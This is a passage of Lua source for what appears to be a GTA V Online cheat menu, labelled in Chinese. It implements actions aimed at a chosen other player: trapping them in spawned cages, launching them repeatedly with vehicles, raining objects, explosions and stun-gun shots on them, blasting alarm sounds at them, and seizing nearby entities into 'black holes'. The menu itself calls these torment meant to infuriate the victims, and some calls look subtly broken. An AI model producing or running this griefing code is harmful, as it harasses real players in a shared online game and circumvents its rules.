      SetObjCo(objs[5], tar1.x, tar1.y + 0.5, tar1.z - 1.0)
      SetObjCo(objs[6], tar1.x + 0.5, tar1.y + 0.5, tar1.z - 1.0)
      SetObjCo(objs[7], tar1.x + 0.5, tar1.y, tar1.z - 1.0)
      SetObjCo(objs[8], tar1.x + 0.5, tar1.y - 0.5, tar1.z - 1.0)
      ENTITY.SET_ENTITY_ROTATION(objs[1], 0, 0, 180, 1, true)
      ENTITY.SET_ENTITY_ROTATION(objs[2], 0, 0, 135, 1, true)
      ENTITY.SET_ENTITY_ROTATION(objs[3], 0, 0, 90, 1, true)
      ENTITY.SET_ENTITY_ROTATION(objs[4], 0, 0, 45, 1, true)
      ENTITY.SET_ENTITY_ROTATION(objs[6], 0, 0, 315, 1, true)
      ENTITY.SET_ENTITY_ROTATION(objs[7], 0, 0, 270, 1, true)
      ENTITY.SET_ENTITY_ROTATION(objs[8], 0, 0, 225, 1, true)
      if wall.invis then
        for index, ent in ipairs(objs) do
            ENTITY.SET_ENTITY_VISIBLE(ent, false, 0)
        end
    end
      for _, horn in ipairs(objs) do
          AUDIO.PLAY_SOUND_FROM_ENTITY(-1, 'Alarm_Interior', horn, 'DLC_H3_FM_FIB_Raid_Sounds', 0, 0)
      end
  end
while obj_table[pid] do
  IPM(targets, tar1, pname, obj_table, pid)
end
if not players.exists(pid) then
  if set.alert then
      gtoast('你正在让他们怒不可遏')
  end
  util.stop_thread()
  obj_table[pid] = nil
end
end)
local ObjSlist = GT(lz, '更改物体笼子样式', {}, '更改物体样式')
GTAC(lz, '解除物体笼子', {'FreeObjcage'}, '释放该玩家', function ()
  if obj_table[pid] then
    DelEnt(obj_table[pid])
    GTluaScript.set_value(objca, false)
    Stopsound()
    obj_table[pid] = false
    else
        if set.alert then
            gtoast('未找到物体笼子')    
        end
    end
end)
GTLuaScript.list_action(PedClist, '特殊NPC', {''}, '更改Ped样式为自定义NPC', SPClist, function(pedsel)
    pedset.mdl = SPC[pedsel]
end)
GTLuaScript.list_action(PedClist, '游戏中的女性NPC', {''}, '更改Ped样式为游戏中的女性NPC', AfClist, function(pedsel)
    pedset.mdl = AfC[pedsel]
end)
GTLuaScript.list_action(PedClist, '游戏中的男性NPC', {''}, '更改Ped样式为游戏中的男性NPC', AMClist, function(pedsel)
    pedset.mdl = AMC[pedsel]
end)
GTLuaScript.list_action(PedClist, '过场动画NPC', {''}, '更改Ped样式为游戏中的过场动画NPC(非必要不使用)', Csplist, function(pedsel)
    pedset.mdl = CSP[pedsel]
end)
GTLuaScript.list_action(PedClist, '帮派成员', {''}, '更改Ped样式为游戏中的帮派成员', GMlist, function(pedsel)
    pedset.mdl = GM[pedsel]
end)
GTLuaScript.list_action(PedClist, '在线模式中的NPC', {''}, '更改Ped样式为在线模式中的NPC', Mpplist, function(pedsel)
    pedset.mdl = Mpp[pedsel]
end)
GTLuaScript.list_action(PedClist, '在线模式过场动画中的女性NPC', {''}, '更改Ped样式为在线模式过场动画中的女性NPC', MSFlist, function(pedsel)
    pedset.mdl = MSF[pedsel]
end)
GTLuaScript.list_action(PedClist, '在线模式过场动画中的男性NPC', {''}, '更改Ped样式为在线模式过场动画中的男性NPC', MCMlist, function(pedsel)
    pedset.mdl = MCM[pedsel]
end)
GTLuaScript.list_action(PedClist, '故事模式角色', {''}, '更改Ped样式为故事模式角色', SMClist, function(pedsel)
    pedset.mdl = SMC[pedsel]
end)
GTLuaScript.list_action(PedClist, '故事模式过场动画女性NPC', {''}, '更改Ped样式为故事模式过场动画女性NPC', Ssflist, function(pedsel)
    pedset.mdl = Ssf[pedsel]
end)
GTLuaScript.list_action(PedClist, '故事模式过场动画男性NPC', {''}, '更改Ped样式为故事模式过场动画男性NPC', Ssmlist, function(pedsel)
    pedset.mdl = Ssm[pedsel]
end)
GTLuaScript.list_action(PedClist, 'DLC中的NPC', {''}, '更改Ped样式为DLC中的NPC', Dlcplist, function(pedsel)
    pedset.mdl = Dlcp[pedsel]
end)
GTLuaScript.list_action(ObjSlist, '路牌', {''}, '更改物体样式为路牌', Siglist, function(objsel)
    objset.mdl = Sigha[objsel]
end)
GTLuaScript.list_action(ObjSlist, '门', {''}, '更改物体样式为门', Dolist, function(objsel)
    objset.mdl = Doha[objsel]
end)
GTLuaScript.list_action(ObjSlist, '室内道具', {''}, '更改物体样式为室内道具', Interlist, function(objsel)
    objset.mdl = Intob[objsel]
end)
GTLuaScript.list_action(ObjSlist, '外部道具', {''}, '更改物体样式为外部道具', Extlist, function(objsel)
    objset.mdl = Extob[objsel]
end)
    local cageas = GT(lz, "困住玩家", {}, "已被大部分菜单阻挡")
    GTAC(cageas, "电击笼子", {"electriccage"}, "你要当索尔还是美国队长？", function()
        local number_of_cages = 6
        local elec_box = util.joaat("prop_elecbox_12")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        pos.z -= 0.5
        request_model(elec_box)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(2.5)
            obj_pos:add(pos)
            for offs_z = 1, 5 do
                local electric_cage = entities.create_object(elec_box, obj_pos)
                spawned_objects[#spawned_objects + 1] = electric_cage
                ENTITY.SET_ENTITY_ROTATION(electric_cage, 90.0, 0.0, angle, 2, 0)
                obj_pos.z += 0.75
                ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
            end
        end
    end)
    GTAC(cageas, "集装箱笼子", {"containercage"}, "", function()
        local container_hash = util.joaat("prop_container_ld_pu")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(container_hash)
        pos.z -= 1
        local container = entities.create_object(container_hash, pos, 0)
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)
    GTAC(cageas, "载具笼子", {"vehiclecage"}, "", function()
        local container_hash = util.joaat("boxville3")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(container_hash)
        local container = entities.create_vehicle(container_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.SET_ENTITY_VISIBLE(container, false)
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)
    GTAC(cageas, "删除所有生成的笼子", {"clearcages"}, "", function()
        local entitycount = 0
        for i, object in ipairs(spawned_objects) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
            entities.delete_by_handle(object)
            spawned_objects[i] = nil
            entitycount += 1
        end
        gtoast("已经删除了 " .. entitycount .. " 个生成的笼子")
    end)
	GTTG(lz, "房笼子", {"foodtruckcage"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		local hash = 4022605402
		STREAMING.REQUEST_MODEL(hash)
		while not STREAMING.HAS_MODEL_LOADED(hash) do		
			wait()
		end
		local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
		cages[#cages + 1] = cage_object
		wait(15)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
        menu.trigger_commands("disarm" .. players.get_name(pid))
	end)
GTTG(lz, "狗笼", {"doghousecage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = -1782242710
	STREAMING.REQUEST_MODEL(hash)
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		wait()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	cages[#cages + 1] = cage_object
	wait(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
    menu.trigger_commands("disarm" .. players.get_name(pid))
end)
    GTAC(lz, "隐形笼子", {""}, "", function()
        local container_hash = util.joaat("benson")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(container_hash)
        local container = entities.create_vehicle(container_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.SET_ENTITY_VISIBLE(container, false)
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)
    GTAC(lz,"载具笼子", {}, "", function()
        veh_to_attach = 1
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)
		if table_kidnap == nil then
			table_kidnap = {}
		end
        hashs = util.joaat("stockade")
        ped_hash = util.joaat("MP_M_Cocaine_01")
        if STREAMING.IS_MODEL_A_VEHICLE(hashs) then
            STREAMING.REQUEST_MODEL(hashs)
            while not STREAMING.HAS_MODEL_LOADED(hashs) do
                wait()
            end
            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}
            ENTITY.SET_ENTITY_VISIBLE(0,ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(0,ped_to_kidnap, true)
            table_kidnap[veh_to_attach] = entities.create_vehicle(hashs, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                wait()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)
            wait(500)
            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hashs)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)
        end
	end)
GTAC(lz, "房子笼子", {""}, "", function()
    zdlzsz(pid)
end)
GTAC(lz, "七度空间", {""}, "", function()
    qdkj(pid)
end)
GTAC(lz, "钱笼子", {""}, "", function()
    zdlz(pid)
end)
GTAC(lz, "垃圾箱", {""}, "", function()
    yylz(pid)
end)
GTAC(lz, "小车车", {""}, "", function()
    cclz(pid)
end)
GTAC(lz, "圣诞快乐", {""}, "", function()
    sdkl2(pid)
end)
GTAC(lz, "电击笼", {""}, "", function()
    powercage(pid)
end)
GTAC(lz, "英国女王笼子", {""}, "", function(cl)
    gueencage(pid)
end)
GTAC(lz, "运输集装箱", {"cage123"}, "", function()
    chestcage(pid)
end)
GTAC(lz, "载具笼子", {"cage4321"}, "", function()
    vehcagelol(pid)
end)
GTAC(lz, "燃气笼", {"gascage4321"}, "", function()
    gascage(pid)
end)
GTLP(lz, "混合笼子", {"toggleallcages"}, "", function(on_toggle)
    if on_toggle then
        menu.trigger_commands("doghousecage" .. players.get_name(pid))
        wait(100)
        menu.trigger_commands("foodtruckcage" .. players.get_name(pid))
        wait(100)
        menu.trigger_commands("clearcages" .. players.get_name(pid))
        wait(100)
        menu.trigger_commands("vehiclecage" .. players.get_name(pid))
        wait(100)
        menu.trigger_commands("containercage" .. players.get_name(pid))
        wait(100)
        menu.trigger_commands("electriccage" .. players.get_name(pid))
        wait(100)
        menu.trigger_commands("ObjCage" .. players.get_name(pid))
        wait(100)
        menu.trigger_commands("RAMDOMPCAGE" .. players.get_name(pid))
        wait(100)
        menu.trigger_commands("PCAGE" .. players.get_name(pid))
        wait(100)
    else
        menu.trigger_commands("doghousecage" .. players.get_name(pid))
        wait(100)
        menu.trigger_commands("foodtruckcage" .. players.get_name(pid))
        wait(100)
        menu.trigger_commands("clearcages" .. players.get_name(pid))
        wait(100)
        menu.trigger_commands("vehiclecage" .. players.get_name(pid))
        wait(100)
        menu.trigger_commands("containercage" .. players.get_name(pid))
        wait(100)
        menu.trigger_commands("electriccage" .. players.get_name(pid))
        wait(100)
        menu.trigger_commands("ObjCage" .. players.get_name(pid))
        wait(100)
        menu.trigger_commands("RAMDOMPCAGE" .. players.get_name(pid))
        wait(100)
        menu.trigger_commands("PCAGE" .. players.get_name(pid))
        wait(100)
        end
    end)
GTAC(lz, "删除笼子", {""}, "只能删除简单的笼子", function()
    for key, value in pairs(cages) do
        entities.delete_by_handle(value)
    end
    local entitycount = 0
    for i, object in ipairs(spawned_objects) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
        entities.delete_by_handle(object)
        spawned_objects[i] = nil
        entitycount += 1
    end
    gtoast("清除笼子完成")
end)
local metmenu = GT(playerMain, '模型生成', {}, '')
local bigolist = {} 
local bigobjset  = {obj= util.joaat('prop_asteroid_01'), ptfx = false, exp = false, speed = 1000}
GTLP(metmenu, '模型生成', {'Oshower'}, '天空下起模型雨', function ()
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local oha = bigobjset.obj
    local r1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS( targets, math.random(-500, 500), math.random(-500, 500), 300.0)
    local r2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS( targets, math.random(-500, 500), math.random(-500, 500), 0)
    local diff = {}
    diff.x = (r2.x - r1.x)*500
    diff.y = (r2.y - r1.y)*500
    diff.z = (r2.z - r1.z)*500
    Streament(oha)
    local bigobj = OBJECT.CREATE_OBJECT(oha, r1.x, r1.y, r1.z, true, true, true)
    ENTITY.SET_ENTITY_HAS_GRAVITY(bigobj, true)
    ENTITY.APPLY_FORCE_TO_ENTITY(bigobj, 2, diff.x, diff.y, diff.z, 0, 0, 0, 0, true, false, true, false, true)
    OBJECT.SET_OBJECT_PHYSICS_PARAMS(bigobj, 100000, 5, 1, 0, 0, .5, 0, 0, 0, 0, 0)
    wait(100)
    bigolist[#bigolist + 1] = bigobj
    for _, met in ipairs(bigolist) do
        local mcoor = ENTITY.GET_ENTITY_COORDS(met)
    if ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(PLAYER.GET_PLAYER_PED(pid),bigolist) < 0.5 then
        Streamptfx("scr_xm_orbital")
        if bigobjset.exp then
            FIRE.ADD_EXPLOSION(mcoor.x, mcoor.y, mcoor.z, 8, 100, true, bigobjset.ptfx, 1, false)
            FIRE.ADD_EXPLOSION(mcoor.x, mcoor.y, mcoor.z, 59, 100, true, bigobjset.ptfx, 1, false)
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD('scr_xm_orbital_blast', mcoor.x, mcoor.y, mcoor.z + 10, 0, 180, 0, 10.0, true, true, true)
        end
    end
end
if #bigolist > 175 then
    DelEnt(bigolist)
    bigolist= {}
end
    wait(bigobjset.speed)
    if not players.exists(pid) then
        util.stop_thread()
    end
end)
GTTG(metmenu, '天基炮爆炸', {''}, '在下模型雨时开启天基炮爆炸', function (on)
    bigobjset.exp = on
end)
GTluaScript.slider(metmenu, '生成延迟', {''}, '调整模型生成延迟', 0, 3000, 1000, 100, function (s)
    bigobjset.speed = s
end)
GTLuaScript.list_action(metmenu, '模型列表', {''}, '改变模型秀的模型', Bigobjlist, function(objsel)
    bigobjset.obj = util.joaat(Bigobj[objsel])
end)
local getPlayerPed = PLAYER.GET_PLAYER_PED
local getEntityCoords = ENTITY.GET_ENTITY_COORDS
local function AudioAnnoyance(Ker_SND, Ker_AUD)
    for i=0, 31, 1 do
        Ker_pped = getPlayerPed(i)
        Ker_pos = getEntityCoords(Ker_pped)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, Ker_SND, Ker_pos.x, Ker_pos.y, Ker_pos.z, Ker_AUD, true, 999999999, true)
    end
end
local function playerActionsSetup(pid)
    local playerMain = GT(soundtrolls_root, "Sounds", {}, "")
    local playerPos = getEntityCoords(getPlayerPed(pid))
    local playerPed = getPlayerPed(pid)
    for i = 1, #SoundAnnoy do
        GTAC(playerMain, SoundAnnoy[i][1], {"kSounds_" .. SoundAnnoy[i][1]}, "", function()
            local snd, aud
            snd = tostring(SoundAnnoy[i][1])
            aud = tostring(SoundAnnoy[i][2])
           -- AUDIO.PLAY_SOUND_FROM_COORD(-1, snd, playerPos.x, playerPos.y, playerPos.z, aud, true, 50, true)
           AUDIO.PLAY_SOUND_FROM_ENTITY(-1, snd, playerPed, aud, true, true)
        end)
        GTLP(playerMain, SoundAnnoy[i][1], {""}, "", function ()
            local snd, aud
            snd = tostring(SoundAnnoy[i][1])
            aud = tostring(SoundAnnoy[i][2])
            --AUDIO.PLAY_SOUND_FROM_COORD(-1, snd, playerPos.x, playerPos.y, playerPos.z, aud, true, 50, true)
            AUDIO.PLAY_SOUND_FROM_ENTITY(-1, snd, playerPed, aud, true, true)
        end)
    end
end
    local jindianegao = GT(playerMain, "经典恶搞", {}, "")
    local jplaym = GT(jindianegao, '击飞玩家', {}, '')
    local juglset = {invisjugc = false, jugsel = util.joaat('speedo2') , jugr = 1000}
    local set = {alert = true}
    local jugloop = GTLP(jplaym, '开始击飞', {'JuggleC'}, '反复击飞玩家', function ()
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
    local pname = PLAYER.GET_PLAYER_NAME(pid)
    Delcar(targets)
    Streament(juglset.jugsel)
    if not PED.IS_PED_RAGDOLL(targets) then
        JuggleCar(juglset.jugsel, tar1, juglset.invisjugc, juglset.jugr)
        else
            if set.alert then
                gtoast(pname..' 正在被击飞')
            end
    end
    if not players.exists(pid) then
        if set.alert then
            gtoast('你正在让他们怒不可遏')
        end
        util.stop_thread()
    end
  end)
GTluaScript.set_value(jugloop, nil)
GTTG(jplaym, '隐形载具', {}, '将攻击载具更改为不可见', function (on)
    juglset.invisjugc = on
end)
local jclist = GT(jplaym, '更改用于击飞的载具', {}, '')
GTLuaScript.list_action(jclist, '载具列表', {''}, '更改用于击飞的载具', Vehlist, function(jugsel)
    juglset.jugsel = util.joaat(Vehha[jugsel])
end)
GTluaScript.slider(jplaym, '击飞频率', {'jugglerate'}, '更改载具击飞间隔速度', 100, 4000, 1000, 100, function (jr)
    juglset.jugr = jr
end)
GTluaScript.text_input(jclist, '输入自定义载具模型名', {'cusjug'}, '输入车辆模型名以更改载具为攻击载具', function(cusveh)
    if STREAMING.IS_MODEL_A_VEHICLE(util.joaat(cusveh)) then
        juglset.jugsel = util.joaat(cusveh)
    else
        if set.alert then
            gtoast('载具名称不正确(请检查你的拼写)')
        end
    end
end, 'toreador')
    function ped_explosion(pid, model_name, amount)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(ped, false)
    for i = 1, (amount or 10) do
        local hash = util.joaat(model_name or "a_c_shepherd")
        load_model(hash)
        local dog = entities.create_ped(28, hash, coords, math.random(0, 270))
        local size = 20
        local x = math.random(-size, size)
        local y = math.random(-size, size)
        local z = 5
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(dog, 1, x, y, z, true, false, true, true)
        AUDIO.PLAY_PAIN(dog, 7, 0)
    end
end
function fake_explosion(pid)
    local entity = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(entity, true)
    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 7, 0, true, true, 0)
end
function load_model(hash) -- lancescript
    local request_time = os.time()
    if not STREAMING.IS_MODEL_VALID(hash) then
        return
    end
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end
local BlackholeEntities = GT(jindianegao, "黑洞恶搞", {}, "")
local dont_stop = false
GTLP(BlackholeEntities,"载具黑洞", {"vehicleblackholes"}, "", function(on)
    for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
        local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
        local locspeed2 = speed
                local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if not PED.IS_PED_A_PLAYER(PedInSeat) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
        ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                    vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                    speed = 100
                    local x_vec = (holecoords['x']-vcoords['x'])*speed
                    local y_vec = (holecoords['y']-vcoords['y'])*speed
                    local z_vec = ((holecoords['z']+hole_zoff)-vcoords['z'])*speed
                    ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, x_vec, y_vec, z_vec, true, false, true, true)
            if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
            end
        end
    end
end)
GTLP(BlackholeEntities,"物体黑洞", {"objectblackholes"}, "", function(on)
    for k, veh in pairs(entities.get_all_objects_as_handles()) do
        local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
        local locspeed2 = speed
                local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if not PED.IS_PED_A_PLAYER(PedInSeat) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
        ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                    vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                    speed = 100
                    local x_vec = (holecoords['x']-vcoords['x'])*speed
                    local y_vec = (holecoords['y']-vcoords['y'])*speed
                    local z_vec = ((holecoords['z']+hole_zoff)-vcoords['z'])*speed
                    ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, x_vec, y_vec, z_vec, true, false, true, true)
            if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
            end
        end
    end
end)
GTLP(BlackholeEntities,"NPC黑洞", {"pedblackholes"}, "", function(on)
    for k, veh in pairs(entities.get_all_peds_as_handles()) do
        local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
        local locspeed2 = speed
                local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if not PED.IS_PED_A_PLAYER(PedInSeat) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
        ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                    vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                    speed = 100
                    local x_vec = (holecoords['x']-vcoords['x'])*speed
                    local y_vec = (holecoords['y']-vcoords['y'])*speed
                    local z_vec = ((holecoords['z']+hole_zoff)-vcoords['z'])*speed
                    ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, x_vec, y_vec, z_vec, true, false, true, true)
            if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
                end
            end
        end
    end)
hole_zoff = 50
GTluaScript.slider(BlackholeEntities, "方向", {"blackholeoffset"}, "", 0, 100, 50, 10, function(s)
hole_zoff = s
end)
local tormentplayer = GT(jindianegao, "折磨玩家")
player_toggle_loop(tormentplayer, pid, "子弹轰炸", {"taseron"}, "", function()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    for i = 1, 50 do
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
    end
    wait()
end)
player_toggle_loop(tormentplayer, pid, "抬起他", {"atomizeron"}, "", function()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    for i = 1, 24 do
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_raypistol"), players.user_ped(), false, true, 1.0)
    end
    wait()
end)
player_toggle_loop(tormentplayer, pid, "闪耀", {"flareon"}, "", function()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    for i = 1, 49 do
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_flare"), players.user_ped(), false, true, 1.0)
    end
    wait()
end)
player_toggle_loop(tormentplayer, pid, "烟花", {"fireworkon"}, "", function()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    for i = 1, 30 do
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_firework"), players.user_ped(), false, true, 1.0)
    end
    wait()
end)
GTLP(tormentplayer, "小行星", {"asteroidon"}, "", function() 
    local coords = players.get_position(pid)
    coords.z = coords['z'] + 15.0
    local asteroid = entities.create_object(3751297495, coords)
    ENTITY.SET_ENTITY_DYNAMIC(asteroid, true)
end)
GTLP(tormentplayer, "布偶猫", {"ragdollon"}, "", function()
    local coords = players.get_position(pid)
    coords.z = coords['z'] - 2.0
    FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 11, 1, false, true, 0, true)
    wait(10)
end)
GTLP(tormentplayer, "鲜血飞溅", {"bloodslash"}, "", function(on_toggle)
        local pos = players.get_position(pid)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "blood_wheel", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "blood_wheel", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
	end)
GTLP(tormentplayer, "电击", {"ptfxelectric"}, "", function(on_toggle)
    local pos = players.get_position(pid)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_sht_electrical_box", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_sht_electrical_box", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
	end)
    GTAC(tormentplayer, "在他头上拉屎(巨大)", {"largeshit"}, "", function(on_toggle)
        GTluaScript.trigger_commands("tp" .. players.get_name(pid))
        local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        c.z = c.z -1
        while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
            STREAMING.REQUEST_ANIM_DICT(agroup)
            wait()
        end
        TASK.TASK_PLAY_ANIM(player, agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true)
        wait(100)
        entities.create_object(mshit, c)
        end)
    GTAC(tormentplayer, "在他头上拉屎(正常)", {"normalshit"}, "", function(on_toggle)
        GTluaScript.trigger_commands("tp" .. players.get_name(pid))
        local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        c.z = c.z -1
        while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
            STREAMING.REQUEST_ANIM_DICT(agroup)
